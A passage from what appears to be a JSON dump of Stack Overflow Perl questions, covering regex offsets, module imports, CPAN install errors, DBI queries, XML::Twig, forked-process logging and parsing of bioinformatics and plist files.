m/$regex/) \n{\n        print \"START Offset = \".$-[0];\n        print \"END Offsset  = \".$+[0];\n        print \"Matched Text = \".$&amp;;\n}\n</code></pre>\n\n<p>In this case, <strong>match is successful</strong> but I am not able to get correct offsets and matched text. Its just printing <code>0</code> as both match-start offset and match-end offset. And its printing empty for matched-text.</p>\n\n<p>I want to understand different components of this regex. Specifically what is this <code>(?sx-im:</code>, and <strong>how to get matched text</strong>.</p>\n\n<p>Please don't ask me the reason for such regex or suggest me to change the regex. This is a software generated regex. I have simplified my problem for the sake of question. </p>\n\n<p>Please guide me where to start understanding this regex and get match offsets.</p>\n"},{"tags":["perl","oop","inheritance","import","base"],"answer_count":3,"favorite_count":1,"up_vote_count":3,"down_vote_count":0,"view_count":114,"score":3,"question_id":12978971,"title":"Perl: How to import subroutines from base class?","body":"<p>I have a base class, named Foo::Base, I need to inherit its methods, like 'new' and to import some subroutines names in a scope:</p>\n\n<pre><code>package Foo::Base;\n\nsub new { ... }\n\nsub import {\n    no strict 'refs';\n\n    my $caller = caller;\n\n    *{\"${caller}::my_sub\"} = sub { 1 };\n}\n\n1;\n</code></pre>\n\n<p>So, I need to use this base class in my second class, Foo::Child:</p>\n\n<pre><code>use base 'Foo::Base';\n</code></pre>\n\n<p>... and it works for inheritance, but it doesn't import 'my_sub' in a scope. I can add string</p>\n\n<pre><code>use Foo::Base;\n</code></pre>\n\n<p>for it and it helps, but I don't want to write something like this:</p>\n\n<pre><code>use base 'Foo::Base';\nuse Foo::Base;\n</code></pre>\n\n<p>This is looks kind of wierd... Is there any suggestions for this problem?</p>\n"},{"tags":["perl","mojolicious"],"answer_count":2,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":32,"score":3,"question_id":13268774,"title":"Can't call method \"headers\" on an undefined value at search.pl line 10","body":"<pre><code>#!/usr/bin/perl\nuse Mojo::Base -strict;\nuse Mojo::DOM;\nuse Mojo::Util qw(decode);\nuse Mojo::UserAgent;\nmy $uri = 'http://efremova.info/word/statja.html';\nmy $sel = 'td#centerCnt ol li';\nmy $charset = 'windows-1251';\nmy $tx = Mojo::UserAgent-&gt;new()-&gt;get($uri);\nmy $res-&gt;headers-&gt;content_type(\"text/html; charset=$charset\");\nmy $dom = $res-&gt;dom;\nmy $el = $dom-&gt;at($sel) or die \"selector $sel not found\";\n$el-&gt;find('span.nobr')-&gt;each(sub { $_-&gt;replace($_-&gt;text) });\nmy $text = $el-&gt;text;\nbinmode(STDOUT, ':encoding(UTF-8)');\n</code></pre>\n\n<p>get error: Can't call method \"headers\" on an undefined value at search.pl line 10.</p>\n\n<p>what should I do?</p>\n\n<p>Thanks a lot</p>\n"},{"tags":["perl"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":2,"view_count":33,"score":-1,"question_id":13268776,"title":"WebPage content reading in Perl without using any LWP modules","body":"<p>Is any other modules is in perl to extract the webpage content other than LWP modules?\nI wanted to read a web page content in perl without using any LWP modules.</p>\n\n<p>Thanks,\nKrishna</p>\n"},{"tags":["perl"],"answer_count":1,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":149,"score":1,"question_id":9828985,"title":"Using Web::Scraper","body":"<p>Im trying to parse some html tags using perl module Web::Scraper but <b>seems Im an inept using perl</b>. I wonder if anyone can look for mistakes in my code...:</p>\n\n<p>This is my HTML to parse (2 urls inside <i>li</i> tags):</p>\n\n<pre><code>&lt;more html above here&gt;\n&lt;div class=\"span-48 last\"&gt;\n&lt;div class=\"span-37\"&gt;\n  &lt;div id=\"zone-extract\" class=\"123\"&gt;\n      &lt;h2 class=\"genres\"&gt;&lt;/h2&gt;  \n                &lt;li&gt;&lt;a href=\"**URL_TO_EXTRACT_1**\"&gt;1&lt;/a&gt;&lt;/li&gt;\n                &lt;li&gt;&lt;a class=\"sel\" href=\"**URL_TO_EXTRACT_2**\"&gt;2&lt;/a&gt;&lt;/li&gt;\n        &lt;li class=\"first\"&gt;PÃ g&lt;/li&gt;\n  &lt;/div&gt;\n&lt;/div&gt;      \n&lt;/div&gt;\n&lt;more stuff from here&gt;\n</code></pre>\n\n<p>Im trying to obtain:</p>\n\n<p>ID:1 Link:URL_TO_EXTRACT_1</p>\n\n<p>ID:2 Link:URL_TO_EXTRACT_2</p>\n\n<p>With this perl code:</p>\n\n<pre><code>my $scraper = scraper {\n    process \".zone-extract &gt; a[href]\", urls =&gt; '@href', id =&gt; 'TEXT';\n    result 'urls';\n};\nmy $links = $scraper-&gt;scrape($response);\n</code></pre>\n\n<p>This is one of the infinite <i>process</i> combinations I tried, with two different results: An empty return, or all the urls inside code (and I only need links inside zone-extract).</p>\n\n<p><b>Resolved with mob's contribution... #zone-extract instead .zone-extract  :)</b> </p>\n"},{"tags":["html","css","perl","hyperlink","markdown"],"answer_count":4,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":1784,"score":1,"question_id":4287156,"title":"How can I make hyperlinks open in a new tab using CSS or Multimarkdown?","body":"<p>I am using <a href=\"http://search.cpan.org/perldoc?Text%3a%3aMultiMarkdown\" rel=\"nofollow\">Text::MultiMarkdown</a> to create HTML files from <a href=\"http://fletcherpenney.net/multimarkdown/\" rel=\"nofollow\">MultiMarkdown</a> documents.</p>\n\n<p>I would like all links to open in a new tab. </p>\n\n<p>Is there a way to configure this behavior using a CSS template, or directly in the MultiMarkdown document (without explicitly writing HTML around each link in the MultiMarkdown document)?</p>\n"},{"tags":["perl"],"answer_count":3,"favorite_count":1,"up_vote_count":2,"down_vote_count":0,"view_count":129,"score":2,"question_id":13171663,"title":"Redirecting STDOUT in child process","body":"<p>Have a Parent process which spawns multipe child process via fork. I want the log files by  the parent and child process  to be separate.  The Problem is child process STDOUT gets redirected into the parent log file as well as the child log file.  Not sure what i need to change to avoid child process log message to get into the parent log file. Also i dont understand in the below setEnvironment function the purpose of  creating OUT and ERR  file handle.  This is a existing code so i kept as it is.  In the parent process  and child process i set the variable $g_LOGFILE  to contain different file name so that separate log files are created. Also i call setEnvironment function in both parent and child process. I tried by closing STDOUT,STDERR,STDIN in the child process and calling the setenvironment but it was not working properly.  </p>\n\n<pre><code>sub setEnvironment()\n{   \n\n  unless ( open(OUT, \"&gt;&amp;STDOUT\") )\n   {\n          print \"Cannot redirect STDOUT\";\n          return 2;\n    }\n    unless ( open(ERR, \"&gt;&amp;STDERR\") )\n    {\n          print \"Cannot redirect STDERR\";\n          return 2;\n    }\n\n\n  unless ( open(STDOUT, \"|tee -ai $g_LOGPATH/$g_LOGFILE\") )\n  {\n          print \"Cannot open log file $g_LOGPATH/$g_LOGFILE\");\n          return 2;\n   }\n   unless ( open(STDERR, \"&gt;&amp;STDOUT\") )\n   {\n                print  \"Cannot redirect STDERR\");\n                return 2 ;\n    }\n    STDOUT-&gt;autoflush(1);\n\n} \n\n\n####################### Main Program ######################################\n\n    $g_LOGFILE=\"parent.log\";\n\n  while ($file = readdir(DIR))\n {  \n     my $pid = fork;\n     if ( $pid ) {\n\n        setEnvironment();\n        #parent process code goes here\n        printf \"%s\\n\", \"parent\";\n        next;\n     }\n     $g_LOGFILE=\"child.log\";\n     setEnvironment();\n     #child code goes here\n     printf \"%s\\n\", \"child\";\n     exit;\n }\n\nwait for @pids\n</code></pre>\n"},{"tags":["perl","module","cpan","strawberry-perl"],"answer_count":2,"favorite_count":0,"up_vote_count":5,"down_vote_count":0,"view_count":4900,"score":5,"question_id":6611382,"title":"How to install module? strawberry perl issues","body":"<p>I am trying to install a perl module withint strawberry perl on Windows 7. \nI'm running the below command, and getting a slew of messages I don't understand. It looks like I am getting 500 errors, as though the page isn't reachable. However, when I point the the mirrors in my broswer I have no problem accessing the ftp directories. I have little perl experience on linux, and none on windows. I tried manually adding a mirror to the urllist, and I don't think that helped.\nAny suggestion would be appreciated.</p>\n\n<pre><code>C:\\Program Files&gt; cpan Win32::IE::Mechanize \n\nCPAN: LWP::UserAgent loaded ok (v5.835)\nCPAN: Time::HiRes loaded ok (v1.9721)\nFetching with LWP:\nhttp://cpan.strawberryperl.com/authors/01mailrc.txt.gz\nLWP failed with code[500] message[Can't connect to cpan.strawberryperl.com:80 (Bad hostname 'cpan.strawberryperl.com')]\nWarning: no success downloading 'C:\\strawberry\\cpan\\sources\\authors\\01mailrc.txt.gz.tmp5264'. Giving up on it.\nFetching with LWP:\nftp://mirror.teklinks.com/CPAN/authors/01mailrc.txt.gz\nLWP failed with code[500] message[LWP::Protocol::MyFTP: Bad hostname 'mirror.teklinks.com']\nFetching with Net::FTP:\nftp://mirror.teklinks.com/CPAN/authors/01mailrc.txt.gz\n  Could not connect to host 'mirror.teklinks.com' with Net::FTP\nFetching with Net::FTP\nftp://mirror.teklinks.com/CPAN/authors/01mailrc.txt.gz.gz\n  Could not connect to host 'mirror.teklinks.com' with Net::FTP\nWarning: no success downloading 'C:\\strawberry\\cpan\\sources\\authors\\01mailrc.txt.gz.tmp5264'. Giving up on it.\nWarning: no success downloading 'C:\\strawberry\\cpan\\sources\\authors\\01mailrc.txt.gz.tmp5264'. Giving up on it.\n\nAs a last resort we now switch to the external ftp command 'C:\\WINDOWS\\system32\\ftp.EXE'\nto get 'C:\\strawberry\\cpan\\sources\\authors\\01mailrc.txt.gz.tmp5264'.\n\nDoing so often leads to problems that are hard to diagnose.\n\nIf you're the victim of such problems, please consider unsetting the\nftp config variable with\n\n    o conf ftp \"\"\n    o conf commit\n\nIssuing \"C:\\WINDOWS\\system32\\ftp.EXE -n\"\n\n  Trying with external ftp to get\n    ftp://mirror.teklinks.com/CPAN/authors/01mailrc.txt.gz\n  Going to send the dialog\n    open mirror.teklinks.com\n    user anonymous win32-vanilla@perl.org\n    lcd C:\\strawberry\\cpan\\sources\\authors\n    cd /\n    cd CPAN\n    cd authors\n    bin\n    passive\n    get 01mailrc.txt.gz 01mailrc.txt.gz.tmp5264\n    quit\n\nUnknown host mirror.teklinks.com.\nNot connected.\nLocal directory now C:\\strawberry\\cpan\\sources\\authors.\nNot connected.\nNot connected.\nNot connected.\nNot connected.\nInvalid command.\nNot connected.\nBad luck... Still failed!\nCan't access URL ftp://mirror.teklinks.com/CPAN/authors/01mailrc.txt.gz.\n\nFetching with LWP:\nhttp://cpan.strawberryperl.com/authors/01mailrc.txt.gz\nLWP failed with code[500] message[Can't connect to cpan.strawberryperl.com:80 (Bad hostname 'cpan.strawberryperl.com')]\nWarning: no success downloading 'C:\\strawberry\\cpan\\sources\\authors\\01mailrc.txt.gz.tmp5264'. Giving up on it.\nWarning: no success downloading 'C:\\strawberry\\cpan\\sources\\authors\\01mailrc.txt.gz.tmp5264'. Giving up on it.\nFetching with LWP:\nftp://mirror.teklinks.com/CPAN/authors/01mailrc.txt.gz\nLWP failed with code[500] message[LWP::Protocol::MyFTP: Bad hostname 'mirror.teklinks.com']\nFetching with Net::FTP:\nftp://mirror.teklinks.com/CPAN/authors/01mailrc.txt.gz\n  Could not connect to host 'mirror.teklinks.com' with Net::FTP\nFetching with Net::FTP\nftp://mirror.teklinks.com/CPAN/authors/01mailrc.txt.gz.gz\n  Could not connect to host 'mirror.teklinks.com' with Net::FTP\nWarning: no success downloading 'C:\\strawberry\\cpan\\sources\\authors\\01mailrc.txt.gz.tmp5264'. Giving up on it.\nWarning: no success downloading 'C:\\strawberry\\cpan\\sources\\authors\\01mailrc.txt.gz.tmp5264'. Giving up on it.\n\nAs a last resort we now switch to the external ftp command 'C:\\WINDOWS\\system32\\ftp.EXE'\nto get 'C:\\strawberry\\cpan\\sources\\authors\\01mailrc.txt.gz.tmp5264'.\n\nDoing so often leads to problems that are hard to diagnose.\n\nIf you're the victim of such problems, please consider unsetting the\nftp config variable with\n\n    o conf ftp \"\"\n    o conf commit\n\nIssuing \"C:\\WINDOWS\\system32\\ftp.EXE -n\"\n\n  Trying with external ftp to get\n    ftp://mirror.teklinks.com/CPAN/authors/01mailrc.txt.gz\n  Going to send the dialog\n    open mirror.teklinks.com\n    user anonymous win32-vanilla@perl.org\n    lcd C:\\strawberry\\cpan\\sources\\authors\n    cd /\n    cd CPAN\n    cd authors\n    bin\n    passive\n    get 01mailrc.txt.gz 01mailrc.txt.gz.tmp5264\n    quit\n\nUnknown host mirror.teklinks.com.\nNot connected.\nLocal directory now C:\\strawberry\\cpan\\sources\\authors.\nNot connected.\nNot connected.\nNot connected.\nNot connected.\nInvalid command.\nNot connected.\nBad luck... Still failed!\nCan't access URL ftp://mirror.teklinks.com/CPAN/authors/01mailrc.txt.gz.\n\nCPAN: YAML loaded ok (v0.73)\nPlease check, if the URLs I found in your configuration file\n(http://cpan.strawberryperl.com/, ftp://mirror.teklinks.com/CPAN/) are\nvalid. The urllist can be edited. E.g. with 'o conf urllist push\nftp://myurl/'\n\nCould not fetch authors/01mailrc.txt.gz\n</code></pre>\n"},{"tags":["perl","osx"],"answer_count":3,"favorite_count":0,"up_vote_count":12,"down_vote_count":0,"view_count":9991,"score":12,"question_id":2623336,"title":"How can I run a Perl script on Mac OS X?","body":"<p><strong>How do I run a Perl script on OS X?</strong> </p>\n\n<p>I honestly can't find the answer anywhere! Presumably I have to run a command in Terminal but what?</p>\n\n<p>(I know this is a real basic and stupid question)</p>\n"},{"tags":["mysql","perl","dbi"],"answer_count":7,"favorite_count":1,"up_vote_count":6,"down_vote_count":0,"view_count":10164,"score":6,"question_id":440799,"title":"How do I know how many rows a Perl DBI query returns?","body":"<p>I'm trying to basically do a search through the database with Perl to tell if there is an item with a certain ID,. This search can return no rows, but it can also return one.</p>\n\n<p>I have the following code:</p>\n\n<pre><code>my $th = $dbh-&gt;prepare(qq{SELECT bi_exim_id FROM bounce_info WHERE bi_exim_id = '$exid'});\n$th-&gt;execute();\nif ($th-&gt;fetch()-&gt;[0] != $exid) {\n        ...\n</code></pre>\n\n<p>Basically, this tries to see if the ID was returned and if it's not, continue with the script. But it is throwing a Null array reference error on the <code>$th-&gt;fetch()-&gt;[0]</code> thing.\nHow can i just simply check to see if it returned rows or now?</p>\n"},{"tags":["c","perl","graph"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":48,"score":1,"question_id":13257626,"title":"Graph library that supports edge labels","body":"<p>I stumbled across <a href=\"http://search.cpan.org/~jhi/Graph-0.94/lib/Graph.pod\" rel=\"nofollow\">Perl's Graph library</a> this morning. I used to write a quick program to find all (weakly) connected components in a directed graph. Here is the program.</p>\n\n<pre><code>use strict;\nuse Graph;\nuse Data::Dumper;\n\nmy $g = Graph-&gt;new();\nforeach my $file(@ARGV)\n{\n  open(my $IN, \"&lt;\", $file) or die(\"cannot open '$file'\");\n  while(my $line = &lt;$IN&gt;)\n  {\n    chomp($line);\n    my($source, $target, $edge_label) = split(/\\t/, $line);\n    $g-&gt;add_edge($source, $target);\n  }\n  close($IN);\n}\n\nmy @clusters = $g-&gt;weakly_connected_components();\nprint Dumper(\\@clusters);\n</code></pre>\n\n<p>...and the input data files look like this.</p>\n\n<pre><code>n1  n2  some_data_encoded_in_a_label\nn1  n3  some_data_encoded_in_a_label\nn4  n5  some_data_encoded_in_a_label\n...\n</code></pre>\n\n<p>...where the first column is the source node label, the second column is the target node label, and the third column is an edge label. I have a couple of data files, each with tens of thousands of edges.</p>\n\n<p>This quick-n-dirty script got the job done, but there were a few things that would have been nice to have.</p>\n\n<ul>\n<li>The connected components returned by the <strong>weakly_connected_components</strong> method were simply arrays of node labels, so the connections between these nodes is lost.</li>\n<li>Even if the method returned a set of nodes <em>and</em> a set of edges, the library does not permit storage of labels or data associated with each edge, which is inconvenient.</li>\n</ul>\n\n<p>Are there any alternative graph libraries that include either or both of these features? The language of implementation is not very important--I'm open to C/C++, Python, Perl, R, etc.</p>\n"},{"tags":["php","perl"],"answer_count":2,"favorite_count":0,"up_vote_count":5,"down_vote_count":1,"view_count":53,"score":4,"question_id":13266372,"title":"I'd like to use Perl regular expression in PHP","body":"<p>I wanto use perl reqexp in PHP.</p>\n\n<p>For example, </p>\n\n<p>Perl:</p>\n\n<pre><code>$url =~ qr{https?://([^\\/\\?&amp;:#]+\\.)?example.com};\n</code></pre>\n\n<p>PHP:</p>\n\n<pre><code>preg_match(\"/https?:\\/\\/([^\\/\\?&amp;:#]+\\.)?example\\.com/\", $url);\n</code></pre>\n"},{"tags":["xml","perl","xml-twig"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":53,"score":2,"question_id":13263193,"title":"XML::Twig changes erased","body":"<p>The program below gives me weird output that I cannot explain:</p>\n\n<pre><code>use strict;\nuse warnings;\nuse XML::Twig;\n\nmy $xml = \nq{&lt;block&gt;\n    &lt;foo&gt;bar baz&lt;/foo&gt;\n&lt;/block&gt;};\n\nmy $twig = XML::Twig-&gt;new(\n        TwigHandlers =&gt; {foo =&gt; \\&amp;foo, block =&gt; \\&amp;block},\n    );\n\nprint \"after parse: \" . $twig-&gt;parse($xml)-&gt;sprint;\n\n\nsub foo {\n    my ( $twig, $foo ) = @_;\n\n    my $text = $foo-&gt;sprint(\"don't print outside element\");\n    my $newSummary = XML::Twig::Elt-&gt;parse( '&lt;p&gt;&lt;i&gt;' . $text . '&lt;/i&gt;&lt;/p&gt;' );\n    $newSummary-&gt;paste( 'before', $foo);\n    my $parent = $foo-&gt;parent;\n    # $foo-&gt;delete;\n    print \"foo: \" . $parent-&gt;sprint . \"\\n\\n\";\n}\n\nsub block {\n    my ($twig, $block) = @_;\n    print \"block: \" . $block-&gt;sprint . \"\\n\\n\";\n}\n</code></pre>\n\n<p>It prints the following:</p>\n\n<pre><code>foo: &lt;block&gt;&lt;p&gt;&lt;i&gt;bar baz&lt;/i&gt;&lt;/p&gt;&lt;foo&gt;bar baz&lt;/foo&gt;&lt;/block&gt;\n\nblock: &lt;block&gt;&lt;p&gt;&lt;i&gt;bar baz&lt;/i&gt;&lt;/p&gt;&lt;foo&gt;bar baz&lt;/foo&gt;&lt;/block&gt;\n\nafter parse: &lt;block&gt;&lt;foo&gt;bar baz&lt;/foo&gt;&lt;/block&gt;\n</code></pre>\n\n<p>So I am modifying the twig inside of the <code>foo</code> handler, the change is sticking around for the <code>block</code> handler to see it, but then when processing is all done, the change goes away. What is going on here? How can I make my change stick for the lifetime of the twig?</p>\n"},{"tags":["perl","training","cpan","timtowtdi"],"answer_count":19,"favorite_count":9,"up_vote_count":19,"down_vote_count":0,"view_count":899,"score":19,"question_id":141641,"title":"What constitutes effective Perl training for non-Perl developers?","body":"<p>I've been working with Perl long enough that many of its idiosyncracies have become second nature to me.  When new programmers join our group, they frequently have little to no experience with Perl, and it's usually my task to train them (to the extent necessary).  I'd like to know what to focus on when training a programmer who is new to Perl but has experience with other languages (this question is meant to be language-agnostic, but most developers I've worked with have come from Java).</p>\n\n<p>A few things occur to me:  </p>\n\n<ul>\n<li>The proper use of sigils</li>\n<li>Referencing/Dereferencing</li>\n<li>Use of list functions like <strong>map</strong>,\n<strong>grep</strong>, <strong>sort</strong></li>\n</ul>\n\n<p>Is there anything in particular that you've found it useful to focus on when helping a programmer to transition to Perl?  Do you stress the similarities or the differences, or both in equal measure?</p>\n"},{"tags":["perl","hash","hash-of-hashes"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":1,"view_count":65,"score":1,"question_id":13263802,"title":"not able to access hash of hash of array values","body":"<p>I have written the following code in Perl. The code is reading a pdb file and getting some values. Ignore the top part of the code,where everything is working perfect.\nProblem is in the sub-routine part, where I try to store arrays in the hash3 with model as key another key position\nthe array values can be accessed inside the if condition using this :</p>\n\n<p>$hash3{$model}{$coordinates}[1]. </p>\n\n<p>but when I go out of all foreach loop and try to access the elements I only get one value.\nPlease look at the end foreach loop and tell me is it the wrong way to access the hash values.</p>\n\n<p>The pdb file I am using can be downloaded from this link <a href=\"http://www.rcsb.org/pdb/download/downloadFile.do?fileFormat=pdb&amp;compression=NO&amp;structureId=1NZS\" rel=\"nofollow\">http://www.rcsb.org/pdb/download/downloadFile.do?fileFormat=pdb&amp;compression=NO&amp;structureId=1NZS</a></p>\n\n<pre><code>#!/usr/bin/perl\nopen(IN,$ARGV[0]);\n\nmy @phosphosites;\nmy $model=1;\nmy %hash3;\nwhile(&lt;IN&gt;)\n  {\n    #findmod(@line);\n    #finddist;\n    #findfreq;\n    if((/^MODRES/) &amp;&amp; (/PHOSPHO/))\n      {\n        @line=split;\n        push(@phosphosites, $line[2]);\n        #print \"$line[4]\";\n      }\n    foreach $elements (@phosphosites){\n      if(/^HETATM\\s+\\d+\\s+CA\\s+$i/)\n        {\n          @line1=split;\n          #print \"$line1[5]\";\n          #print \"$line1[6] $line1[7] $line1[8]\\n\";\n          push(@phosphositesnum, $line1[5]);\n        }\n    }\n    $pos=$line1[5];\n    #findspatial(\\@line,\\@line1);\n  }\n\nmy @ori_data=removeDuplicates(@phosphositesnum);\nsub removeDuplicates {\n  my %seen = ();\n  my @vals = ();\n\n  foreach my $i (@_) {\n    unless ($seen{$i}) {\n      push @vals, $i;\n      $seen{$i} = 1;\n    }\n  }\n\n  return @vals;\n}\n\n$a=(@phosphosites);\nprint \"$a\\n\";\nprint \"@phosphosites\\n\";\nprint \"@ori_data\\n\";\n\nclose(IN);\n\nopen(IN1,$ARGV[0]);\nmy (@data)=&lt;IN1&gt;;\nspatial(\\@ori_data);\nsub spatial {\n\n  my @spatial_array1=@{$_[0]};\n\n  foreach $coordinates(@spatial_array1)\n    {\n      $model=1;\n      {foreach $data1(@data){\n\n\n\n        if($data1=~ m/^HETATM\\s+\\d+\\s+CA\\s+[A-Z]*\\s+[A-Z]*\\s+$coordinates/)\n          {\n            @cordivals=split(/\\s+/,$data1);\n            push @{ $sphash{$model} },[$cordivals[6], $cordivals[7], $cordivals[8]];\n            $hash3{$model}{$coordinates}= \\@cordivals;\n            #print \"$model $coordinates $hash3{$model}{$coordinates}[6] $hash3{$model}{$coordinates}[7] $hash3{$model}{$coordinates}[8]\\n\";\n            #print \"$model $sphash{$model}[$i][0] $sphash{$model}[$i][1] $sphash{$model}[$i][2]\\n\";\n\n          }\n\n        elsif($data1=~ m/^ENDMDL/)\n          {\n            $model++;\n          }\n        #print \"$model $coordinates $hash3{$model}{$coordinates}[6] $hash3{$model}{$coordinates}[7] $hash3{$model}{$coordinates}[8]\\n\";\n\n\n      }\n     }\n    }\n\n    #foreach $z1 (sort keys %hash3)\n    #  {\n    #    foreach $z2(@spatial_array1){\n    #      print \"$z1 $z2\";\n    #      print \"$hash3{$z1}{$z2}[6]\\n\";\n    #      print \"$z2\\n\";\n    #    }\n    #  }\n}\n</code></pre>\n\n<p>After using the Data::Dumper option it is giving me this kind of output</p>\n\n<pre><code>$VAR1 = {\n      '11' =&gt; {\n                '334' =&gt; [\n                           'HETATM',\n                           '115',\n                           'CA',\n                           'SEP',\n                           'A',\n                           '343',\n                           '-0.201',\n                           '-2.884',\n                           '1.022',\n                           '1.00',\n                           '99.99',\n                           'C'\n                         ],\n\n                '342' =&gt; $VAR1-&gt;{'11'}{'334'},\n\n                '338' =&gt; $VAR1-&gt;{'11'}{'334'},\n\n                '335' =&gt; $VAR1-&gt;{'11'}{'334'},\n                '340' =&gt; $VAR1-&gt;{'11'}{'334'},\n\n                '343' =&gt; $VAR1-&gt;{'11'}{'334'},\n\n                '336' =&gt; $VAR1-&gt;{'11'}{'334'}\n              },\n\n      '7' =&gt; {\n\n               '334' =&gt; $VAR1-&gt;{'11'}{'334'},\n\n               '342' =&gt; $VAR1-&gt;{'11'}{'334'},\n\n               '338' =&gt; $VAR1-&gt;{'11'}{'334'},\n\n               '335' =&gt; $VAR1-&gt;{'11'}{'334'},\n\n               '340' =&gt; $VAR1-&gt;{'11'}{'334'},\n\n               '343' =&gt; $VAR1-&gt;{'11'}{'334'},\n\n               '336' =&gt; $VAR1-&gt;{'11'}{'334'}\n\n             },\n\n      '2' =&gt; {\n\n               '334' =&gt; $VAR1-&gt;{'11'}{'334'},\n\n               '342' =&gt; $VAR1-&gt;{'11'}{'334'},\n               ...\n</code></pre>\n"},{"tags":["perl","soap-client"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":94,"score":-3,"question_id":12863132,"title":"changing soap body attribute in perl SOAP::Lite 0.7","body":"<p>Is it possible to set an attribute in the <code>soap:Body</code> tag using perl and <code>SOAP::Lite 0.7.</code> </p>\n\n<p>In all the examples I have seen I can change the attributes inside the body tag using </p>\n\n<p>SOAP::Data * calls and use the <code>$soap-&gt;call($dataValue)</code> for this purpose.</p>\n\n<p>What I really need is the way to add an ID attribute to the <code>soap:Body</code> tag in <code>SOAP::Lite perl</code>. Any pointers in this direction would be appreciated. Thanks.</p>\n"},{"tags":["perl","testing","epic"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":26,"score":-1,"question_id":13253093,"title":"Can not see variable during debugging with eclipse error","body":"<p>I am using EPIC+Eclipse for perl development. When debugging perl script, I am not seeeing variables during debugging. Here is my setup.</p>\n\n<p>Windows 7 64-bit</p>\n\n<p>Perl 5.8.9</p>\n\n<p>Eclipse </p>\n\n<p>EPIC 0.5</p>\n\n<p>During debugging, initially it went fine; at a later statement, I get a popup with following error message. </p>\n\n<p>An internal error occurred during: \"child count update\".\n11809</p>\n\n<p>I have made changes to Cwd.pm too as described in other forums.</p>\n\n<p>Any help will be highly appreciated!!!\nI heard about padre too. Will it work with my activeState perl 5.8.9?</p>\n\n<p>Error log shows the following exception:</p>\n\n<p><a href=\"http://pastebin.com/jvTMMbAt\" rel=\"nofollow\">http://pastebin.com/jvTMMbAt</a></p>\n"},{"tags":["perl"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":85,"score":1,"question_id":13256426,"title":"Perl coding: How to extract part of a line in a text file and print it to an output file","body":"<p>I have a large text files in the format shown below -</p>\n\n<pre><code>ID  SNP\nFT  SNP 433\nFT      /note=\"refAllele: T SNPstrains: 7083_1#5=C 7414_8#8=C 7480_8#49=C \"\nFT      /colour=1\nFT  SNP 442\nFT      /note=\"refAllele: T SNPstrains: 7065_8#2=C 7065_8#94=C 7083_1#2=C 7083_1#3=C 7083_1#41=C 7083_1#42=C 7083_1#43=C \"\nFT      /colour=1\nFT  SNP 460\nFT      /note=\"refAllele: T SNPstrains: 7564_8#14=C \"\nFT      /colour=1\nFT  SNP 703\nFT      /note=\"refAllele: G SNPstrains: 7521_5#39=A (non-synonymous) (AA Ala-&gt;Thr) \"\nFT      /colour=2\nFT  SNP 937\nFT      /note=\"refAllele: G SNPstrains: 7414_8#30=T (non-synonymous) (AA Val-&gt;Leu) \"\nFT      /colour=2\nFT  SNP 1269\nFT      /note=\"refAllele: G SNPstrains: 7480_7#22=A (synonymous) 7480_7#62=A (synonymous) \"\nFT      /colour=3\nFT  SNP 1804\nFT      /note=\"refAllele: T SNPstrains: 7414_7#66=A (non-synonymous) (AA Ser-&gt;Thr) 7414_8#44=A (non-synonymous) (AA Ser-&gt;Thr) 7521_6#54=A (non-synonymous) (AA Ser-&gt;Thr) \"\nFT      /colour=2\n</code></pre>\n\n<p>This is the code I used -</p>\n\n<pre><code>$file=\"input file\";\nopen IN, \"$file\";\nopen OUT, \"&gt;output file\";\nprint OUT \"Coordinate   No of Strains   AA Change\\n\";\nwhile(&lt;IN&gt;){\n    if(m/^FT\\s+SNP\\s+(\\d+)/){\n            $SNP=$1;        \n    }elsif(m/^FT\\s+\\/note=\"(.*)\"/){\n        $line=$1;\n        $count = ($line =~ tr/=/=/);\n        $line =~ m/\\((AA \\w+-&gt;\\w+)\\)\\s*$/;\n        $change = $1 || \"\";\n    }elsif(m/^FT\\s+\\/colour=(\\d+)/){\n        print OUT \"$SNP $count $change\\n\" if $cod{$1} eq \"non\";\n    }\n}\n</code></pre>\n\n<p>The aim is to have an output file that is like the one below (for the above part of text file)</p>\n\n<pre><code>Coordinates No of Strains AA Change\n703         1             AA Ala-&gt;Thr\n937         1             AA Val-&gt;Leu\n1804        3             AA Ser-&gt;Thr\n</code></pre>\n\n<p>However, when I apply the code to the text file I receive an error: Use of uninitialised values ($count or $change) in concatenation (.) or string at line 23. The line in question is</p>\n\n<pre><code>print OUT \"$SNP $count $change\\n\" if $cod{$1} eq \"non\";\n</code></pre>\n\n<p>The error refers to lines that contain</p>\n\n<pre><code>FT      /colour=2\n</code></pre>\n\n<p>i.e., lines that show a non-synonymous mutation, such as line 13 in the sample text.</p>\n\n<p>Please be advised that I am a novice in programming and a large part of this code was not written by me. Any help would be appreciated!</p>\n\n<p>Many thanks in advance.</p>\n"},{"tags":["perl"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":81,"score":1,"question_id":12939061,"title":"Perl going through a list of folders","body":"<p>I have a folder named Logs, which contains several folders Run 1, Run 1 (1), Run 2 (2), etc. Each of these folder contains a plist file which I need to parse through. But I am not able to open the file. I am running the code below:</p>\n\n<pre><code>my $count = 0;\nmy $path  = \"Logs/\";\n\nfor my $file (glob(\"${path}*/*Results.plist\")) {\n\n    # initialize parser object and find insances of Fail\n    my $xp      = XML::XPath-&gt;new(filename=&gt;$file);\n    my @nodeset = $xp-&gt;find('/dict/array/dict/string[1]');\n\n    foreach my $element (@nodeset){\n\n        if ($element-&gt;string_value == \"Fail\") {\n\n            $count++;\n        }\n    }\n}\n\nprint $count;\n</code></pre>\n\n<p>Edit: Now I need to look for \"Fail\" in the \"string\" child node. The plist file has 4 fails but my current code is returning only 2. Any ideas why?</p>\n\n<p>The plist file has a structure smilar to this:</p>\n\n<pre><code>&lt;plist version=\"1.0\"&gt;\n&lt;dict&gt;\n&lt;key&gt;All Samples&lt;/key&gt;\n&lt;array&gt;\n&lt;dict&gt;\n    &lt;key&gt;LogType&lt;/key&gt;\n    